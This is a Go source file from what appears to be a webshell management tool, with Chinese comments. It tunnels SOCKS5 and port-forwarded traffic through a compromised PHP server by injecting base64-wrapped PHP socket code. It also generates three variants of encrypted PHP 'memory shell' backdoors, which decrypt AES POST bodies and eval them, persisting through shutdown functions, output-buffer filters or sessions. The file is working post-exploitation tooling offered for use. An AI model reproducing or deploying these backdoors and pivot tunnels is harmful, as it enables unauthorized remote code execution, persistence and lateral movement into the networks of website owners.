package webshell

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"sync"
	"time"
)

// ─── SOCKS5 代理服务器 ─────────────────────────────────────────────────────────

// SocksServer 在本地启动 SOCKS5 服务器，通过 PHP shell session 中转流量。
type SocksServer struct {
	mu          sync.Mutex
	running     bool
	listener    net.Listener
	agent       *Agent
	localPort   int
	activeConns int
}

func newSocksServer(agent *Agent) *SocksServer {
	return &SocksServer{agent: agent}
}

func (s *SocksServer) Start(localPort int) error {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.running {
		return fmt.Errorf("SOCKS5 代理已在运行（端口 %d）", s.localPort)
	}
	ln, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", localPort))
	if err != nil {
		return fmt.Errorf("监听 127.0.0.1:%d 失败: %w", localPort, err)
	}
	s.listener = ln
	s.localPort = localPort
	s.running = true
	go s.acceptLoop()
	return nil
}

func (s *SocksServer) Stop() {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.listener != nil {
		_ = s.listener.Close()
		s.listener = nil
	}
	s.running = false
}

type socksStatus struct {
	Running     bool `json:"running"`
	LocalPort   int  `json:"localPort"`
	ActiveConns int  `json:"activeConns"`
}

func (s *SocksServer) Status() socksStatus {
	s.mu.Lock()
	defer s.mu.Unlock()
	return socksStatus{s.running, s.localPort, s.activeConns}
}

func (s *SocksServer) acceptLoop() {
	for {
		conn, err := s.listener.Accept()
		if err != nil {
			break
		}
		s.mu.Lock()
		s.activeConns++
		s.mu.Unlock()
		go func() {
			defer func() {
				s.mu.Lock()
				s.activeConns--
				s.mu.Unlock()
			}()
			s.handleConn(conn)
		}()
	}
}

func (s *SocksServer) handleConn(conn net.Conn) {
	defer conn.Close()

	targetHost, targetPort, err := socks5Handshake(conn)
	if err != nil {
		return
	}
	hash := newRelayHash()
	if err := s.agent.SocksCreate(targetHost, targetPort, hash); err != nil {
		_, _ = conn.Write([]byte{0x05, 0x04, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
		return
	}
	_, _ = conn.Write([]byte{0x05, 0x00, 0x00, 0x01, 0, 0, 0, 0, 0, 0})
	relayThroughPHP(conn, s.agent, hash)
}

// socks5Handshake 完成 SOCKS5 握手，返回目标 (host, port)。
func socks5Handshake(conn net.Conn) (string, string, error) {
	_ = conn.SetDeadline(time.Now().Add(10 * time.Second))
	defer conn.SetDeadline(time.Time{}) //nolint:errcheck
	buf := make([]byte, 256)

	if _, err := io.ReadFull(conn, buf[:2]); err != nil {
		return "", "", err
	}
	if buf[0] != 0x05 {
		return "", "", fmt.Errorf("非 SOCKS5")
	}
	if n := int(buf[1]); n > 0 {
		if _, err := io.ReadFull(conn, buf[:n]); err != nil {
			return "", "", err
		}
	}
	_, _ = conn.Write([]byte{0x05, 0x00})

	if _, err := io.ReadFull(conn, buf[:4]); err != nil {
		return "", "", err
	}
	if buf[0] != 0x05 || buf[1] != 0x01 {
		return "", "", fmt.Errorf("不支持的命令")
	}

	var host string
	switch buf[3] {
	case 0x01:
		if _, err := io.ReadFull(conn, buf[:4]); err != nil {
			return "", "", err
		}
		host = net.IP(buf[:4]).String()
	case 0x03:
		if _, err := io.ReadFull(conn, buf[:1]); err != nil {
			return "", "", err
		}
		n := int(buf[0])
		if _, err := io.ReadFull(conn, buf[:n]); err != nil {
			return "", "", err
		}
		host = string(buf[:n])
	case 0x04:
		if _, err := io.ReadFull(conn, buf[:16]); err != nil {
			return "", "", err
		}
		host = net.IP(buf[:16]).String()
	default:
		return "", "", fmt.Errorf("不支持的地址类型")
	}

	if _, err := io.ReadFull(conn, buf[:2]); err != nil {
		return "", "", err
	}
	port := int(buf[0])<<8 | int(buf[1])
	return host, fmt.Sprintf("%d", port), nil
}

// ─── 端口映射服务器 ────────────────────────────────────────────────────────────

// PortMapServer 监听本地端口，通过 PHP shell 转发到目标 host:port。
type PortMapServer struct {
	mu          sync.Mutex
	running     bool
	listener    net.Listener
	agent       *Agent
	localPort   int
	targetHost  string
	targetPort  string
	activeConns int
}

func newPortMapServer(agent *Agent) *PortMapServer {
	return &PortMapServer{agent: agent}
}

func (p *PortMapServer) Start(localPort int, targetHost, targetPort string) error {
	p.mu.Lock()
	defer p.mu.Unlock()
	if p.running {
		return fmt.Errorf("端口映射已在运行（本地端口 %d）", p.localPort)
	}
	ln, err := net.Listen("tcp", fmt.Sprintf("0.0.0.0:%d", localPort))
	if err != nil {
		return fmt.Errorf("监听端口 %d 失败: %w", localPort, err)
	}
	p.listener = ln
	p.localPort = localPort
	p.targetHost = targetHost
	p.targetPort = targetPort
	p.running = true
	go p.acceptLoop()
	return nil
}

func (p *PortMapServer) Stop() {
	p.mu.Lock()
	defer p.mu.Unlock()
	if p.listener != nil {
		_ = p.listener.Close()
		p.listener = nil
	}
	p.running = false
}

type portMapStatus struct {
	Running     bool   `json:"running"`
	LocalPort   int    `json:"localPort"`
	TargetHost  string `json:"targetHost"`
	TargetPort  string `json:"targetPort"`
	ActiveConns int    `json:"activeConns"`
}

func (p *PortMapServer) Status() portMapStatus {
	p.mu.Lock()
	defer p.mu.Unlock()
	return portMapStatus{p.running, p.localPort, p.targetHost, p.targetPort, p.activeConns}
}

func (p *PortMapServer) acceptLoop() {
	for {
		conn, err := p.listener.Accept()
		if err != nil {
			break
		}
		p.mu.Lock()
		p.activeConns++
		p.mu.Unlock()
		go func() {
			defer func() {
				p.mu.Lock()
				p.activeConns--
				p.mu.Unlock()
			}()
			p.handleConn(conn)
		}()
	}
}

func (p *PortMapServer) handleConn(conn net.Conn) {
	defer conn.Close()

	hash := newRelayHash()
	p.mu.Lock()
	tHost, tPort := p.targetHost, p.targetPort
	p.mu.Unlock()

	if err := p.agent.SocksCreate(tHost, tPort, hash); err != nil {
		return
	}
	relayThroughPHP(conn, p.agent, hash)
}

// ─── 公共中继 ──────────────────────────────────────────────────────────────────

func newRelayHash() string {
	b := make([]byte, 8)
	_, _ = rand.Read(b)
	return hex.EncodeToString(b)
}

// relayThroughPHP 在本地 TCP 连接与 PHP session 隧道之间双向中继数据。
func relayThroughPHP(conn net.Conn, agent *Agent, hash string) {
	done := make(chan struct{})

	go func() {
		defer close(done)
		for {
			data, running, err := agent.SocksRead(hash)
			if err != nil || !running {
				break
			}
			if len(data) > 0 {
				if _, werr := conn.Write(data); werr != nil {
					break
				}
			} else {
				time.Sleep(20 * time.Millisecond)
			}
		}
	}()

	buf := make([]byte, 32768)
	for {
		select {
		case <-done:
			goto end
		default:
		}
		_ = conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
		n, err := conn.Read(buf)
		if n > 0 {
			if werr := agent.SocksWrite(hash, buf[:n]); werr != nil {
				break
			}
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				continue
			}
			break
		}
	}
end:
	_ = agent.SocksClose(hash)
	<-done
}

// ─── Agent PHP 操作：SOCKS/PortMap ────────────────────────────────────────────

// SocksCreate 在 PHP 端建立到 targetIP:targetPort 的 TCP 隧道（后台运行）。
func (a *Agent) SocksCreate(targetIP, targetPort, hash string) error {
	ipB64 := base64.StdEncoding.EncodeToString([]byte(targetIP))
	portB64 := base64.StdEncoding.EncodeToString([]byte(targetPort))
	hashB64 := base64.StdEncoding.EncodeToString([]byte(hash))
	okB64 := base64.StdEncoding.EncodeToString([]byte("ok"))
	code := "$ip=base64_decode('" + ipB64 + "');$port=base64_decode('" + portB64 + "');$hash=base64_decode('" + hashB64 + "');\n" +
		"@session_start();\n" +
		"$_SESSION['run_'.$hash]=true;\n" +
		"$_SESSION['writebuf_'.$hash]='';\n" +
		"$_SESSION['readbuf_'.$hash]='';\n" +
		"session_write_close();\n" +
		"@ob_end_clean();\n" +
		"$resp='{\"status\":\"200\",\"msg\":\"" + okB64 + "\"}';\n" +
		"header('Content-Type: application/json');\n" +
		"header('Connection: close');\n" +
		"header('Content-Length: '.strlen($resp));\n" +
		"echo $resp;flush();\n" +
		"$s=@stream_socket_client(\"tcp://{$ip}:{$port}\");\n" +
		"if(!$s&&is_callable('fsockopen'))$s=@fsockopen($ip,(int)$port);\n" +
		"if(!$s)exit(0);\n" +
		"stream_set_blocking($s,0);\n" +
		"set_time_limit(0);ignore_user_abort(1);\n" +
		"while(true){\n" +
		"  @session_start();\n" +
		"  $run=isset($_SESSION['run_'.$hash])?$_SESSION['run_'.$hash]:false;\n" +
		"  $wb=isset($_SESSION['writebuf_'.$hash])?$_SESSION['writebuf_'.$hash]:'';\n" +
		"  if($wb!==''){@fwrite($s,$wb);$_SESSION['writebuf_'.$hash]='';}\n" +
		"  session_write_close();\n" +
		"  if(!$run)break;\n" +
		"  $rb='';while(($r=@fread($s,4096))!==false&&$r!=='')$rb.=$r;\n" +
		"  if($rb!==''){@session_start();$_SESSION['readbuf_'.$hash].=$rb;session_write_close();}\n" +
		"  usleep(10000);\n" +
		"}\n" +
		"fclose($s);\n"
	_, err := a.send(code)
	return err
}

// SocksRead 从 PHP 隧道读取缓冲数据，返回 (data, running, error)。
func (a *Agent) SocksRead(hash string) ([]byte, bool, error) {
	hashB64 := base64.StdEncoding.EncodeToString([]byte(hash))
	code := "$hash=base64_decode('" + hashB64 + "');" +
		"@session_start();" +
		"$run=isset($_SESSION['run_'.$hash])?$_SESSION['run_'.$hash]:false;" +
		"$buf=isset($_SESSION['readbuf_'.$hash])?$_SESSION['readbuf_'.$hash]:'';" +
		"$_SESSION['readbuf_'.$hash]='';" +
		"session_write_close();" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode(json_encode(['running'=>$run,'data'=>base64_encode($buf)]))]);"
	result, err := a.send(code)
	if err != nil {
		return nil, false, err
	}
	raw, err := decodeMsg(result)
	if err != nil {
		return nil, false, err
	}
	var payload struct {
		Running bool   `json:"running"`
		Data    string `json:"data"`
	}
	if err := json.Unmarshal(raw, &payload); err != nil {
		return nil, false, err
	}
	data, _ := base64.StdEncoding.DecodeString(payload.Data)
	return data, payload.Running, nil
}

// SocksWrite 向 PHP 隧道写入数据。
func (a *Agent) SocksWrite(hash string, data []byte) error {
	hashB64 := base64.StdEncoding.EncodeToString([]byte(hash))
	dataB64 := base64.StdEncoding.EncodeToString(data)
	code := "$hash=base64_decode('" + hashB64 + "');$data=base64_decode('" + dataB64 + "');" +
		"@session_start();$_SESSION['writebuf_'.$hash].=$data;session_write_close();" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);"
	_, err := a.send(code)
	return err
}

// SocksClose 关闭 PHP 隧道。
func (a *Agent) SocksClose(hash string) error {
	hashB64 := base64.StdEncoding.EncodeToString([]byte(hash))
	code := "$hash=base64_decode('" + hashB64 + "');" +
		"@session_start();$_SESSION['run_'.$hash]=false;session_write_close();" +
		"echo json_encode(['status'=>'200','msg'=>base64_encode('ok')]);"
	_, err := a.send(code)
	return err
}

// ─── 内存马 PHP 代码生成 ───────────────────────────────────────────────────────

// MemShellPHP 生成 PHP 内存马代码。
func MemShellPHP(shellType, key string) string {
	k := deriveKey(key)
	switch shellType {
	case "shutdown":
		// register_shutdown_function 持久化
		return "<?php\n" +
			"@error_reporting(0);\n" +
			"register_shutdown_function(function(){\n" +
			"    $key=\"" + k + "\";\n" +
			"    $post=openssl_decrypt(base64_decode(file_get_contents('php://input')),'AES-128-ECB',$key,OPENSSL_RAW_DATA);\n" +
			"    if($post)@eval($post);\n" +
			"});\n" +
			"?>"
	case "filter":
		// ob_start 回调过滤器
		return "<?php\n" +
			"@error_reporting(0);\n" +
			"$key=\"" + k + "\";\n" +
			"ob_start(function($out)use($key){\n" +
			"    $post=openssl_decrypt(base64_decode(file_get_contents('php://input')),'AES-128-ECB',$key,OPENSSL_RAW_DATA);\n" +
			"    if($post)@eval($post);\n" +
			"    return $out;\n" +
			"});\n" +
			"?>"
	case "session":
		// session 持久化
		return "<?php\n" +
			"@error_reporting(0);\n" +
			"@session_start();\n" +
			"$key=\"" + k + "\";\n" +
			"$_SESSION['shell_key']=$key;\n" +
			"$post=openssl_decrypt(base64_decode(file_get_contents('php://input')),'AES-128-ECB',$key,OPENSSL_RAW_DATA);\n" +
			"if($post)@eval($post);\n" +
			"?>"
	default:
		return phpShell(k)
	}
}

// ─── 模块代理管理器 ────────────────────────────────────────────────────────────

// shellProxy 管理单个 shell 的代理状态。
type shellProxy struct {
	mu      sync.Mutex
	socks   *SocksServer
	portmap *PortMapServer
}

// proxyManager 管理所有 shell 的代理实例。
type proxyManager struct {
	mu      sync.Mutex
	proxies map[string]*shellProxy
}

func newProxyManager() *proxyManager {
	return &proxyManager{proxies: make(map[string]*shellProxy)}
}

func (pm *proxyManager) get(shellID string) *shellProxy {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	p, ok := pm.proxies[shellID]
	if !ok {
		p = &shellProxy{}
		pm.proxies[shellID] = p
	}
	return p
}

func (pm *proxyManager) stopAll() {
	pm.mu.Lock()
	defer pm.mu.Unlock()
	for _, p := range pm.proxies {
		p.mu.Lock()
		if p.socks != nil {
			p.socks.Stop()
		}
		if p.portmap != nil {
			p.portmap.Stop()
		}
		p.mu.Unlock()
	}
}
